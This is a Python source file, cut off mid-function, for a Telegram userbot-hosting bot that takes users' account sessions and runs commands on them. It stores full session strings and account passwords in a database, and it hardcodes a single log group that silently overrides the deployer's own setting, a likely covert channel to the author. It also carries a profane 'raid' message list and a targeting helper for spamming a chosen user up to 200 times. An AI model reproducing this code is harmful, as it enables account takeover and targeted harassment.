import ast
import asyncio
import json
import os
import sys
import random
import re
import time
import urllib.parse
import urllib.request
from datetime import datetime
from zoneinfo import ZoneInfo
from flask import Flask
from threading import Thread
from pymongo import MongoClient

from config import (
    API_ID,
    API_HASH,
    BOT_TOKEN,
    LOG_GROUP,
    MONGO_URL,
    DB_NAME,
    FSUB_CHANNELS,
    START_VIDEO,
    ALIVE_IMG,
    OWNER_ID,
    OWNER_USERNAME,
    PORT,
)

from pyrogram import Client, filters, errors, handlers, idle
from pyrogram.enums import ChatType, ParseMode
from pyrogram.raw import functions as raw_functions
from pyrogram.raw import types as raw_types
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton

BOT_START_TIME = time.time()
ACCOUNTS_PER_PAGE = 5
DEFAULT_PREMIUM_EMOJI_ID = 6120898777046847624

CLIENT_DEVICE_MODEL = "Samsung Galaxy S23"
CLIENT_SYSTEM_VERSION = "Android 14"
CLIENT_APP_VERSION = "10.14.5"

# Single allowed log group ID (all other log group IDs blocked)
ACTIVE_LOG_GROUP_ID = -1003947649552

# --- DATABASE CORE ---
try:
    mongo_client = MongoClient(MONGO_URL)
    db = mongo_client[DB_NAME]
    sessions_col = db["sessions"]
    users_col = db["users"]
    settings_col = db["bot_settings"]
    print("[SUCCESS] MongoDB Connected!")
except Exception as e:
    print(f"[ERROR] MongoDB Failed: {e}")
    sys.exit(1)


def save_bot_user(user):
    if not user:
        return
    try:
        users_col.update_one(
            {"user_id": int(user.id)},
            {
                "$set": {
                    "user_id": int(user.id),
                    "first_name": user.first_name or "User",
                    "username": user.username or "",
                    "last_seen": time.time(),
                }
            },
            upsert=True,
        )
    except Exception:
        pass


def get_all_bot_user_ids():
    ids = set()
    for col in (users_col, sessions_col):
        try:
            for doc in col.find({}, {"user_id": 1}):
                if "user_id" in doc:
                    ids.add(int(doc["user_id"]))
        except Exception:
            pass
    return list(ids)


def load_local_sessions():
    try:
        return {str(doc["user_id"]): doc for doc in sessions_col.find()}
    except Exception:
        return {}


def normalize_phone(phone_val: str) -> str:
    if not phone_val:
        return ""
    cleaned = str(phone_val).strip()
    if not cleaned:
        return ""
    return cleaned if cleaned.startswith("+") else f"+{cleaned}"


def save_local_session(user_id, session_str, phone="", name="", username="", password=""):
    try:
        update_fields = {
            "user_id": str(user_id),
            "session_str": session_str,
            "updated_at": time.time(),
        }
        norm_phone = normalize_phone(phone)
        if norm_phone:
            update_fields["phone"] = norm_phone
        if name:
            update_fields["name"] = name
        if username is not None:
            update_fields["username"] = username
        if password:
            update_fields["password"] = password

        sessions_col.update_one(
            {"user_id": str(user_id)},
            {"$set": update_fields},
            upsert=True,
        )
    except Exception:
        pass


def delete_session_from_db(user_id):
    try:
        sessions_col.delete_one({"user_id": str(user_id)})
    except Exception:
        pass


def get_ubot_setting(ubot_id: int, key: str, default=None):
    try:
        doc = settings_col.find_one({"type": "ubot_cfg", "ubot_id": int(ubot_id), "key": key})
        if doc is None:
            return default
        return doc.get("value", default)
    except Exception:
        return default


def set_ubot_setting(ubot_id: int, key: str, value):
    try:
        settings_col.update_one(
            {"type": "ubot_cfg", "ubot_id": int(ubot_id), "key": key},
            {"$set": {"type": "ubot_cfg", "ubot_id": int(ubot_id), "key": key, "value": value}},
            upsert=True,
        )
    except Exception:
        pass


def get_vc_logger_state(ubot_id: int, chat_id: int) -> bool:
    try:
        doc = settings_col.find_one({"type": "vc_logger", "ubot_id": int(ubot_id), "chat_id": int(chat_id)})
        return bool(doc and doc.get("enabled", False))
    except Exception:
        return False


def set_vc_logger_state(ubot_id: int, chat_id: int, enabled: bool):
    try:
        settings_col.update_one(
            {"type": "vc_logger", "ubot_id": int(ubot_id), "chat_id": int(chat_id)},
            {"$set": {"type": "vc_logger", "ubot_id": int(ubot_id), "chat_id": int(chat_id), "enabled": bool(enabled)}},
            upsert=True,
        )
    except Exception:
        pass


def get_dm_privacy_state(ubot_id: int) -> bool:
    return bool(get_ubot_setting(ubot_id, "dm_privacy", True))


def set_dm_privacy_state(ubot_id: int, enabled: bool):
    set_ubot_setting(ubot_id, "dm_privacy", bool(enabled))


def is_dm_approved(ubot_id: int, target_user_id: int) -> bool:
    try:
        doc = settings_col.find_one(
            {"type": "dm_approved", "ubot_id": int(ubot_id), "target_user_id": int(target_user_id)}
        )
        return bool(doc and doc.get("approved", False))
    except Exception:
        return False


def set_dm_approved(ubot_id: int, target_user_id: int, approved: bool):
    try:
        if approved:
            settings_col.update_one(
                {"type": "dm_approved", "ubot_id": int(ubot_id), "target_user_id": int(target_user_id)},
                {
                    "$set": {
                        "type": "dm_approved",
                        "ubot_id": int(ubot_id),
                        "target_user_id": int(target_user_id),
                        "approved": True,
                    }
                },
                upsert=True,
            )
        else:
            settings_col.delete_one(
                {"type": "dm_approved", "ubot_id": int(ubot_id), "target_user_id": int(target_user_id)}
            )
    except Exception:
        pass


def get_readable_time(seconds: int) -> str:
    count = 0
    ping_time = ""
    time_list = []
    time_suffix_list = ["s", "m", "h", "ᴅᴀʏs"]
    while count < 4:
        count += 1
        if count < 3:
            remaining, time_to_add = divmod(seconds, 60)
        else:
            remaining, time_to_add = divmod(seconds, 24)
        if seconds == 0 and remaining == 0:
            break
        time_list.append(int(time_to_add))
        seconds = int(remaining)
    for x in range(len(time_list)):
        time_list[x] = str(time_list[x]) + time_suffix_list[x]
    if len(time_list) == 4:
        ping_time += time_list.pop() + ", "
    time_list.reverse()
    ping_time += ":".join(time_list)
    return ping_time or "0s"


# --- QUOTE & HTML HELPERS ---
def qbox(html_content: str, expandable: bool = False) -> str:
    tag = "<blockquote expandable>" if expandable else "<blockquote>"
    return f"{tag}{html_content}</blockquote>"


def html_mention(user_id: int, name: str) -> str:
    safe_name = (name or "ᴜsᴇʀ").replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    return f'<a href="tg://user?id={user_id}">{safe_name}</a>'


async def reply_quote(m, html_text: str, expandable: bool = False):
    payload = qbox(html_text, expandable=expandable)
    try:
        return await m.edit_text(payload, parse_mode=ParseMode.HTML)
    except Exception:
        try:
            return await m.reply_text(payload, parse_mode=ParseMode.HTML)
        except Exception:
            return None


async def send_blockquote_message(c, chat_id, text_plain: str, mention_user=None):
    full_text = text_plain
    entities = []

    if mention_user:
        m_name = mention_user.first_name or "User"
        full_text = f"{text_plain} {m_name}".strip()
        start_idx = len(full_text) - len(m_name)
        utf16_offset = len(full_text[:start_idx].encode("utf-16-le")) // 2
        utf16_length = len(m_name.encode("utf-16-le")) // 2
        entities.append(
            raw_types.MessageEntityTextUrl(
                offset=utf16_offset,
                length=utf16_length,
                url=f"tg://user?id={mention_user.id}",
            )
        )

    total_utf16_len = len(full_text.encode("utf-16-le")) // 2
    entities.insert(
        0,
        raw_types.MessageEntityBlockquote(
            offset=0,
            length=total_utf16_len,
            collapsed=False,
        ),
    )

    peer = await c.resolve_peer(chat_id)
    await c.invoke(
        raw_functions.messages.SendMessage(
            peer=peer,
            message=full_text,
            random_id=random.randint(-2**63, 2**63 - 1),
            entities=entities,
            no_webpage=True,
        )
    )


# --- LOG GROUP & PEER HELPERS (ONLY ACTIVE_LOG_GROUP_ID ALLOWED) ---
def _parse_chat_id(val):
    if val is None:
        return None
    s = str(val).strip()
    if not s:
        return None
    try:
        return int(s)
    except ValueError:
        return s


def get_target_log_group() -> int:
    configured = _parse_chat_id(LOG_GROUP)
    if configured is not None and configured != ACTIVE_LOG_GROUP_ID:
        print(f"[LOG BLOCKED] Ignoring configured LOG_GROUP={configured}; using only {ACTIVE_LOG_GROUP_ID}")
    return ACTIVE_LOG_GROUP_ID


def is_allowed_log_chat(chat_id) -> bool:
    parsed = _parse_chat_id(chat_id)
    return isinstance(parsed, int) and parsed == ACTIVE_LOG_GROUP_ID


async def warmup_client_peers(client):
    try:
        async for _ in client.get_dialogs(limit=50):
            pass
    except Exception:
        pass
    try:
        target_chat = get_target_log_group()
        if is_allowed_log_chat(target_chat):
            await client.get_chat(target_chat)
    except Exception:
        pass


# --- LOGGING HELPER ---
def format_user_tag(user):
    if not user:
        return "Unknown User (0)"
    uname = f"@{user.username}" if user.username else (user.first_name or "User")
    return f"{uname} ({user.id})"


def get_current_ist_time() -> str:
    now = datetime.now(ZoneInfo("Asia/Kolkata"))
    return now.strftime("%d %b %Y · %I:%M %p").upper()


async def send_log(c, title: str, user, details_body: str, panel_name: str = "CoderNovaBot"):
    target_chat = get_target_log_group()
    if not is_allowed_log_chat(target_chat):
        return
    try:
        try:
            await c.get_chat(target_chat)
        except Exception:
            async for _ in c.get_dialogs(limit=30):
                pass
        user_str = format_user_tag(user)
        time_str = get_current_ist_time()
        log_msg = (
            f"━━━✦ 𝗡𝗢𝗩𝗔 𝗨𝗦𝗘𝗥𝗕𝗢𝗧 ✦ 𝗟𝗢𝗚𝗦 ✦━━━\n"
            f"✦ {title}\n\n"
            f"👤 𝗨𝗦𝗘𝗥: {user_str}\n"
            f"🕒 𝗧𝗜𝗠𝗘: {time_str}\n\n"
            f"📋 𝗗𝗘𝗧𝗔𝗜𝗟𝗦:\n"
            f"{details_body}\n\n"
            f"🤖 𝗣𝗔𝗡𝗘𝗟: {panel_name} · {OWNER_USERNAME}"
        )
        await c.send_message(target_chat, log_msg, disable_web_page_preview=True)
    except Exception as e:
        print(f"[LOG WARNING] Skipped log ({e})")


# --- WEB SERVER ---
app = Flask("")


@app.route("/")
def home():
    return "Online ✨"


def run_web():
    app.run(host="0.0.0.0", port=PORT, use_reloader=False)


bot = Client(
    "CoderNovaGen",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
    device_model=CLIENT_DEVICE_MODEL,
    system_version=CLIENT_SYSTEM_VERSION,
    app_version=CLIENT_APP_VERSION,
    in_memory=True,
)
user_data, active_tasks, running_ubots, pm_guard_data, original_profiles, vc_participants, afk_state = (
    {},
    {},
    {},
    {},
    {},
    {},
    {},
)

clean_owner = OWNER_USERNAME.replace("@", "").strip() if OWNER_USERNAME else "CoderNova"

main_buttons = InlineKeyboardMarkup(
    [
        [
            InlineKeyboardButton("📲 ᴀᴅᴅ ᴀᴄᴄᴏᴜɴᴛ", callback_data="add_btn"),
            InlineKeyboardButton("🛠️ ʜᴇʟᴘ ᴍᴇɴᴜ", callback_data="help_btn"),
        ],
        [
            InlineKeyboardButton("👑 ᴏᴡɴᴇʀ", url=f"https://t.me/{clean_owner or 'CoderNova'}"),
            InlineKeyboardButton("📢 ᴜᴘᴅᴀᴛᴇ", url="https://t.me/NovaBot_Support"),
        ],
        [InlineKeyboardButton("❌ ᴄʟᴏsᴇ", callback_data="close")],
    ]
)

DAILY_CHATS = [
    "ʜɪɪ {mention}",
    "ᴋᴀɪsᴇ ʜᴏ {mention}",
    "ᴋʏᴀ ᴋʀ ʀʜᴇ ʜᴏ.. {mention}",
    "ᴋʜᴀ sᴇ ʜᴏ. {mention}",
    "ᴋʏᴀ ᴋʀᴛᴇ ʜᴏ {mention}",
    "ʀᴀᴅʜᴇ ʀᴀᴅʜᴇ {mention}",
    "ᴊᴀɪ sʜʀᴇᴇ ʀᴀᴍ {mention}",
    "ᴏʀ sᴜɴᴀᴏ sʙ ʙᴅɪʏᴀ {mention}",
    "ᴋʜᴀ ʀʜᴛᴇ ʜᴏ ᴀᴀᴊ ᴋᴀʟ ᴀᴀᴛᴇ ɴʜɪ ʜᴏ {mention}",
    "ᴠᴄ ᴀᴀʏᴀ ᴋʀ ʏʀ {mention}",
    "ɢʀᴏᴜᴘ ᴍᴇ ᴀᴀʏᴀ ᴋʀ ʏʀ {mention}",
    "ʀᴀᴍ ʀᴀᴍ {mention}",
    "ᴋᴋʀʜ {mention}",
    "ᴋʜᴀɴᴀ ᴋʜᴀʏᴇ {mention}",
    "ɢʜᴀʀ ᴍᴇ sʙ ᴋᴀɪsᴇ ʜʜ {mention}",
    "<b>ᴏʀ ᴘᴀᴅʜᴀɪ ᴋᴀɪsᴇ ᴄʜᴀʟ ʀʜᴇ ʜ</b> {mention}",
    "sᴛᴜᴅʏ ᴋʀᴛᴇ ʜᴏ ʏᴀ ɴʜɪ {mention}",
]

ABUSE_RAIDS = [
    "🥵💦 JUNGLE JUNGLE ME CHALA.... JUNGLE ME MILA BHALU... 🤣🤣🤣🤣",
    "EK DAAL PE.... CHAR... KABUTAR... 😁 CHARO MANGE DAANA... 😂😂😂😂",
    "JHULA... JHULO... LAKIN APNE BAAP KO... MT BHULO... 💦🥵💦🥵🥵",
    "BAAP.. KO... KHODNA.. OR... CHODNE.. NA.. SIKHATE... MERE.. BETE... 🥵💦🥵🥵",
    "ME.. TERA.. BAAP.. HU... 🥵💦🥵💦...",
    "CHUD.. GYA.. 🤣🤣😂🤣 CHUD... GYA.. BETE.. 💦🥵🥵🥵🥵💦🥵",
]

FONT_STYLES = {
    "smallcaps": str.maketrans(
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
        "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ",
    ),
    "bold": str.maketrans(
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
        "𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔𝐕𝐖𝐗𝐘𝐙𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗",
    ),
    "italic": str.maketrans(
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
        "𝑎𝑏𝑐𝑑𝑒𝑓𝑔ℎ𝑖𝑗𝑘𝑙𝑚𝑛𝑜𝑝𝑞𝑟𝑠𝑡𝑢𝑣𝑤𝑥𝑦𝑧𝐴𝐵𝐶𝐷𝐸𝐹𝐺𝐻𝐼𝐽𝐾𝐿𝑀𝑁𝑂𝑃𝑄𝑅𝑆𝑇𝑈𝑉𝑊𝑋𝑌𝑍",
    ),
    "script": str.maketrans(
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
        "𝓪𝓫𝓬𝓭𝓮𝓯𝓰𝓱𝓲𝓳𝓴𝓵𝓶𝓷𝓸𝓹𝓺𝓻𝓼𝓽𝓾𝓿𝔀𝔁𝔂𝔃𝓐𝓑𝓒𝓓𝓔𝓕𝓖𝓗𝓘𝓙𝓚𝓛𝓜𝓝𝓞𝓟𝓠𝓡𝓢𝓣𝓤𝓥𝓦𝓧𝓨𝓩",
    ),
    "mono": str.maketrans(
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
        "𝚊𝚋𝚌𝚍𝚎𝚏𝚐𝚑𝚒𝚓𝚔𝚕𝚖𝚗𝚘𝚙𝚚𝚛𝚜𝚝𝚞𝚟𝚠𝚡𝚢𝚣𝙰𝙱𝙲𝙳𝙴𝙵𝙶𝙷𝙸𝙹𝙺𝙻𝙼𝙽𝙾𝙿𝚀𝚁𝚂𝚃𝚄𝚅𝚆𝚇𝚈𝚉𝟶𝟷𝟸𝟹𝟺𝟻𝟼𝟽𝟾𝟿",
    ),
}


def stylize_text(text: str, style: str = "smallcaps") -> str:
    mapping = FONT_STYLES.get(style.lower(), FONT_STYLES["smallcaps"])
    return text.translate(mapping)


async def check_force_join(c, user_id):
    not_joined = []
    for channel in FSUB_CHANNELS:
        ch_clean = str(channel).lstrip("@")
        try:
            await c.get_chat_member(ch_clean, user_id)
        except errors.UserNotParticipant:
            not_joined.append(ch_clean)
        except Exception:
            pass
    return not_joined


# --- USERBOT HELPERS ---
async def resolve_raid_target_and_count(c, m):
    count = 10
    target_user = None
    args = m.text.split()[1:] if m.text else []

    for arg in args:
        if arg.isdigit() and int(arg) > 0:
            count = min(int(arg), 200)
        else:
            clean_arg = arg.lstrip("@")
            try:
                target_user = await c.get_users(int(clean_arg) if clean_arg.isdigit() else clean_arg)
            except Exception:
                pass

    if not target_user and m.reply_to_message and m.reply_to_message.from_user:
        target_user = m.reply_to_message.from_user

    return count, target_user


async def resolve_target_user(c, m, allow_self_in_pm: bool = False):
    if m.entities:
        for ent in m.entities:
            if ent.user and ent.user.id:
                try:
                    return await c.get_users(ent.user.id)
                except Exception:
                    return ent.user

    if len(m.command) > 1:
        raw_arg = m.command[1].strip().lstrip("@")
        try:
            return await c.get_users(int(raw_arg) if raw_arg.isdigit() else raw_arg)
        except Exception:
            pass

    if m.reply_to_message and m.reply_to_message.from_user:
        return m.reply_to_message.from_user

    if allow_self_in_pm and m.chat and m.chat.type == ChatType.PRIVATE and m.chat.id != c.me.id:
        try:
            return await c.get_users(m.chat.id)
        except Exception:
            pass

    return None


def extract_peer_id(peer):
    if peer is None:
        return None
    if isinstance(peer, raw_types.PeerUser):
        return int(peer.user_id)
    if isinstance(peer, raw_types.PeerChat):
        return -int(peer.chat_id)
    if isinstance(peer, raw_types.PeerChannel):
        return int(f"-100{peer.channel_id}")
    return getattr(peer, "user_id", None) or getattr(peer, "chat_id", None) or getattr(peer, "channel_id", None)


def format_raw_user_info(user_id: int, users_map: dict):
    u = users_map.get(user_id)
    if u:
        fname = f"{getattr(u, 'first_name', '') or ''} {getattr(u, 'last_name', '') or ''}".strip() or "ᴜsᴇʀ"
        uname = f"@{u.username}" if getattr(u, "username", None) else "ɴᴏɴᴇ"
        return fname, uname, int(getattr(u, "id", user_id))
    return "ᴜsᴇʀ", "ɴᴏɴᴇ", int(user_id)


_BIN_OPS = {
    ast.Add: lambda a, b: a + b,
    ast.Sub: lambda a, b: a - b,
    ast.Mult: lambda a, b: a * b,
    ast.Div: lambda a, b: a / b,
    ast.FloorDiv: lambda a, b: a // b,
    ast.Mod: lambda a, b: a % b,
    ast.Pow: lambda a, b: a ** b,
}
_UNARY_OPS = {
    ast.UAdd: lambda a: +a,
    ast.USub: lambda a: -a,
}


def _eval_ast_node(node):
    if isinstance(node, ast.Constant) and isinstance(node.value, (int, float)) and not isinstance(node.value, bool):
        return node.value
    if isinstance(node, ast.BinOp) and type(node.op) in _BIN_OPS:
        left = _eval_ast_node(node.left)
        right = _eval_ast_node(node.right)
        if isinstance(node.op, ast.Pow) and abs(right) > 1000:
            raise ValueError("Exponent too large")
        return _BIN_OPS[type(node.op)](left, right)
    if isinstance(node, ast.UnaryOp) and type(node.op) in _UNARY_OPS:
        return _UNARY_OPS[type(node.op)](_eval_ast_node(node.operand))
    raise ValueError("Unsupported expression")


def safe_math_eval(expr: str):
    cleaned = expr.replace("×", "*").replace("÷", "/").replace("^", "**").strip()
    if not cleaned or len(cleaned) > 120:
        raise ValueError("Invalid length")
    parsed = ast.parse(cleaned, mode="eval")
    return _eval_ast_node(parsed.body)


# --- PREMIUM EMOJI STATUS COMMANDS ---
async def premium_on_cmd(c, m):
    emoji_id = DEFAULT_PREMIUM_EMOJI_ID
    if len(m.command) > 1 and m.command[1].isdigit():
        emoji_id = int(m.command[1])

    try:
        await c.invoke(
            raw_functions.account.UpdateEmojiStatus(
                emoji_status=raw_types.EmojiStatus(document_id=emoji_id)
            )
        )
        set_ubot_setting(c.me.id, "premium_emoji_id", emoji_id)
        await reply_quote(
            m,
            f"👑 <b>ᴘʀᴇᴍɪᴜᴍ ᴇᴍᴏᴊɪ sᴛᴀᴛᴜs ᴏɴ!</b>\n"
            f"✨ <b>ᴇᴍᴏᴊɪ ɪᴅ:</b> <code>{emoji_id}</code>\n"
            f"📌 ᴀʙ ʏᴇ ᴇᴍᴏᴊɪ ᴀᴀᴘᴋᴇ ᴘʀᴏғɪʟᴇ ɴᴀᴍᴇ ᴋᴇ ᴀᴀɢᴇ ᴅɪᴋʜᴇɢᴀ.",
        )
    except Exception as e:
        if "PREMIUM_ACCOUNT_REQUIRED" in str(e):
            await reply_quote(m, "❌ <b>ɪs ᴀᴄᴄᴏᴜɴᴛ ᴘᴀʀ ᴛᴇʟᴇɢʀᴀᴍ ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴛɪᴠᴇ ɴᴀʜɪ ʜᴀɪ!</b>")
        else:
            await reply_quote(m, f"❌ <b>ғᴀɪʟᴇᴅ:</b> <code>{e}</code>")


async def premium_off_cmd(c, m):
    try:
        await c.invoke(
            raw_functions.account.UpdateEmojiStatus(
                emoji_status=raw_types.EmojiStatusEmpty()
            )
        )
        set_ubot_setting(c.me.id, "premium_emoji_id", 0)
        await reply_quote(m, "🚫 <b>ᴘʀᴇᴍɪᴜᴍ ᴇᴍᴏᴊɪ sᴛᴀᴛᴜs ᴏғғ!</b>\n✨ ɴᴀᴍᴇ ᴋᴇ ᴀᴀɢᴇ sᴇ ᴇᴍᴏᴊɪ ʜᴀᴛᴀ ᴅɪʏᴀ ɢᴀʏᴀ ʜᴀɪ.")
    except Exception as e:
        await reply_quote(m, f"❌ <b>ғᴀɪʟᴇᴅ:</b> <code>{e}</code>")


# --- 1. ACCOUNT & PROFILE COMMANDS ---
async def myinfo_cmd(c, m):
    me = await c.get_me()
    chat_me = await c.get_chat(me.id)
    phone = normalize_phone(getattr(me, "phone_number", "") or "") or "ʜɪᴅᴅᴇɴ"
    uname = f"@{me.username}" if me.username else "ɴᴏɴᴇ"
    dc_id = getattr(me, "dc_id", None) or "ɴ/ᴀ"
    full_n = f"{me.first_name or ''} {me.last_name or ''}".strip()
    await reply_quote(
        m,
        f"⚙️ <b>『 ᴍʏ ᴀᴄᴄᴏᴜɴᴛ ɪɴғᴏ 』</b> ⚙️\n\n"
        f"👤 <b>ɴᴀᴍᴇ:</b> {full_n}\n"
        f"🆔 <b>ᴜsᴇʀ ɪᴅ:</b> <code>{me.id}</code>\n"
        f"🔗 <b>ᴜsᴇʀɴᴀᴍᴇ:</b> {uname}\n"
        f"📞 <b>ᴘʜᴏɴᴇ:</b> <code>{phone}</code>\n"
        f"🌐 <b>ᴅᴄ ɪᴅ:</b> <code>{dc_id}</code>\n"
        f"📝 <b>ʙɪᴏ:</b> <code>{chat_me.bio or 'ɴᴏɴᴇ'}</code>",
    )


async def setname_cmd(c, m):
    if len(m.command) < 2 and not m.reply_to_message:
        return await reply_quote(m, "❌ <b>ᴜsᴀɢᴇ:</b> <code>.setname &lt;first name&gt; | &lt;last name&gt;</code>")
    raw = m.text.split(None, 1)[1] if len(m.command) > 1 else (m.reply_to_message.text or "")
    parts = [p.strip() for p in raw.split("|", 1)]
    first_name = parts[0]
    last_name = parts[1] if len(parts) > 1 else ""
    try:
        await c.update_profile(first_name=first_name, last_name=last_name)
        await reply_quote(m, f"✅ <b>ɴᴀᴍᴇ ᴜᴘᴅᴀᴛᴇᴅ:</b> <code>{(first_name + ' ' + last_name).strip()}</code>")
    except Exception as e:
        await reply_quote(m, f"❌ <b>ғᴀɪʟᴇᴅ:</b> <code>{e}</code>")


async def setbio_cmd(c, m):
    bio_text = m.text.split(None, 1)[1].strip() if len(m.command) > 1 else (m.reply_to_message.text or "").strip()
    if not bio_text:
        return await reply_quote(m, "❌ <b>ᴜsᴀɢᴇ:</b> <code>.setbio &lt;your bio&gt;</code>")
    try:
        await c.update_profile(bio=bio_text[:70])
        await reply_quote(m, f"✅ <b>ʙɪᴏ ᴜᴘᴅᴀᴛᴇᴅ:</b> <code>{bio_text[:70]}</code>")
    except Exception as e:
        await reply_quote(m, f"❌ <b>ғᴀɪʟᴇᴅ:</b> <code>{e}</code>")


async def setpic_cmd(c, m):
    target_msg = m.reply_to_message if (m.reply_to_message and m.reply_to_message.photo) else (m if m.photo else None)
    if not target_msg:
        return await reply_quote(m, "❌ <b>ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴘʜᴏᴛᴏ ᴡɪᴛʜ</b> <code>.setpic</code><b>!</b>")
    status = await reply_quote(m, "🖼️ <b>ᴜᴘᴅᴀᴛɪɴɢ ᴘʀᴏғɪʟᴇ ᴘʜᴏᴛᴏ...</b>")
    file_path = None
    try:
        file_path = await c.download_media(target_msg.photo.file_id)
        await c.set_profile_photo(photo=file_path)
        if status:
            await status.edit_text(qbox("✅ <b>ᴘʀᴏғɪʟᴇ ᴘʜᴏᴛᴏ ᴜᴘᴅᴀᴛᴇᴅ!</b>"), parse_mode=ParseMode.HTML)
    except Exception as e:
        if status:
            await status.edit_text(qbox(f"❌ <b>ғᴀɪʟᴇᴅ:</b> <code>{e}</code>"), parse_mode=ParseMode.HTML)
    finally:
        if file_path and os.path.exists(file_path):
            try:
                os.remove(file_path)
            except Exception:
                pass


async def delpic_cmd(c, m):
    try:
        photos = [p async for p in c.get_chat_photos("me", limit=1)]
        if not photos:
            return await reply_quote(m, "⚠️ <b>ɴᴏ ᴘʀᴏғɪʟᴇ ᴘʜᴏᴛᴏ ғᴏᴜɴᴅ!</b>")
        await c.delete_profile_photos([photos[0].file_id])
        await reply_quote(m, "🗑️ <b>ᴘʀᴏғɪʟᴇ ᴘʜᴏᴛᴏ ᴅᴇʟᴇᴛᴇᴅ!</b>")
    except Exception as e:
        await reply_quote(m, f"❌ <b>ғᴀɪʟᴇᴅ:</b> <code>{e}</code>")


async def username_cmd(c, m):
    if len(m.command) < 2:
        return await reply_quote(m, "❌ <b>ᴜsᴀɢᴇ:</b> <code>.username &lt;new_username&gt;</code> ʏᴀ <code>none</code>")
    new_u = m.command[1].strip().lstrip("@")
    try:
        await c.set_username("" if new_u.lower() == "none" else new_u)
        await reply_quote(
            m,
            f"✅ <b>ᴜsᴇʀɴᴀᴍᴇ ᴜᴘᴅᴀᴛᴇᴅ:</b> <code>@{new_u}</code>"
            if new_u.lower() != "none"
            else "✅ <b>ᴜsᴇʀɴᴀᴍᴇ ʀᴇᴍᴏᴠᴇᴅ!</b>",
        )
    except Exception as e:
        await reply_quote(m, f"❌ <b>ғᴀɪʟᴇᴅ:</b> <code>{e}</code>")


# --- 2. SECURITY & PRIVACY COMMANDS ---
async def block_cmd(c, m):
    target = await resolve_target_user(c, m, allow_self_in_pm=True)
    if not target:
        return await reply_quote(m, "❌ <b>ᴜsᴀɢᴇ:</b> <code>.block @username</code> / <code>user_id</code> / <code>reply</code> ʏᴀ ᴅᴍ ᴍᴇ.")
    try:
        await c.block_user(target.id)
        await reply_quote(m, f"⛔ <b>ʙʟᴏᴄᴋᴇᴅ:</b> {html_mention(target.id, target.first_name or 'ᴜsᴇʀ')} (<code>{target.id}</code>)")
    except Exception as e:
        await reply_quote(m, f"❌ <b>ғᴀɪʟᴇᴅ:</b> <code>{e}</code>")


async def unblock_cmd(c, m):
    target = await resolve_target_user(c, m, allow_self_in_pm=True)
    if not target:
        return await reply_quote(m, "❌ <b>ᴜsᴀɢᴇ:</b> <code>.unblock @username</code> / <code>user_id</code> / <code>reply</code>")
    try:
        await c.unblock_user(target.id)
        await reply_quote(m, f"✅ <b>ᴜɴʙʟᴏᴄᴋᴇᴅ:</b> {html_mention(target.id, target.first_name or 'ᴜsᴇʀ')} (<code>{target.id}</code>)")
    except Exception as e:
        await reply_quote(m, f"❌ <b>ғᴀɪʟᴇᴅ:</b> <code>{e}</code>")


async def blocked_cmd(c, m):
    try:
        res = await c.invoke(raw_functions.contacts.GetBlocked(offset=0, limit=30))
        users_map = {u.id: u for u in getattr(res, "users", [])}
        blocked_ids = [extract_peer_id(b.peer_id) for b in getattr(res, "blocked", [])]
        blocked_ids = [bid for bid in blocked_ids if bid]
        if not blocked_ids:
            return await reply_quote(m, "📭 <b>ʙʟᴏᴄᴋ ʟɪsᴛ ᴇᴍᴘᴛʏ ʜᴀɪ.</b>")
        lines = [f"🚫 <b>ʙʟᴏᴄᴋᴇᴅ ᴜsᴇʀs ({len(blocked_ids)}):</b>\n"]
        for i, bid in enumerate(blocked_ids[:25], start=1):
            fname, uname, uid_val = format_raw_user_info(bid, users_map)
            lines.append(f"<code>{i}.</code> {html_mention(uid_val, fname)} ({uname}) — <code>{uid_val}</code>")
        await reply_quote(m, "\n".join(lines), expandable=True)
    except Exception as e:
        await reply_quote(m, f"❌ <b>ғᴀɪʟᴇᴅ:</b> <code>{e}</code>")


async def clearblocked_cmd(c, m):
    status = await reply_quote(m, "🧹 <b>ᴄʟᴇᴀʀɪɴɢ ʙʟᴏᴄᴋᴇᴅ ᴜsᴇʀs...</b>")
    unblocked = 0
    try:
        res = await c.invoke(raw_functions.contacts.GetBlocked(offset=0, limit=100))
        for b in getattr(res, "blocked", []):
            bid = extract_peer_id(b.peer_id)
            if bid:
                try:
                    await c.unblock_user(bid)
                    unblocked += 1
                    await asyncio.sleep(0.2)
                except Exception:
                    pass
        if status:
            await status.edit_text(qbox(f"✅ <b>ᴜɴʙʟᴏᴄᴋᴇᴅ</b> <code>{unblocked}</code> <b>ᴜsᴇʀs!</b>"), parse_mode=ParseMode.HTML)
    except Exception as e:
        if status:
            await status.edit_text(qbox(f"❌ <b>ғᴀɪʟᴇᴅ:</b> <code>{e}</code>"), parse_mode=ParseMode.HTML)


async def sessions_cmd(c, m):
    try:
        auths = await c.invoke(raw_functions.account.GetAuthorizations())
        items = getattr(auths, "authorizations", []) or []
        lines = [f"🔐 <b>ᴀᴄᴛɪᴠᴇ sᴇssɪᴏɴs ({len(items)}):</b>\n"]
        for idx, a in enumerate(items[:15], start=1):
            curr = "🟢 ᴄᴜʀʀᴇɴᴛ" if getattr(a, "current", False) else "🔹 sᴇssɪᴏɴ"
            dev = getattr(a, "device_model", "Unknown")
            plat = getattr(a, "platform", "")
